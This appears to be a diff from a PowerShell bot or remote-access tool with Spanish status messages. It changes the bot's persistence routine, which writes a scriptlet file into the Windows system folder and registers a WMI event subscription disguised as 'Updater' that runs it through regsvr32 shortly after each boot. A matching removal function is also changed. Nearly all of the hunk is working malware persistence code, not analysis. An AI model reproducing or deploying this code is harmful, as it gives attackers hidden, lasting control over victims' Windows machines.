@@ -210,8 +210,8 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
     <method name="Exec"></method>
 </public>
 </scriptlet>'
-$plantilla_sct | Out-File -Encoding ascii -FilePath "c:\windows\system32\bot.sct"
-Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\regsvr32.exe /s /n /u /i:c:\windows\system32\temp.sct scrobj.dll ";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
+$plantilla_sct | Out-File -Encoding ascii -FilePath "c:\windows\system32\drivers\temp.sct"
+Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\regsvr32.exe /s /n /u /i:c:\windows\system32\drivers\temp.sct scrobj.dll ";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
 
@@ -219,7 +219,7 @@ function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
 else {
-$comando = (Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='UPDATER'").CommandLineTemplate
+$comando = (Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='UPDATER'").CommandLineTemplate; Remove-Item "c:\windows\system32\drivers\temp.sct"
 if ($comando -eq $null -or $comando -eq "") {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
 Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='Updater'" | Remove-WmiObject; return $texto; break
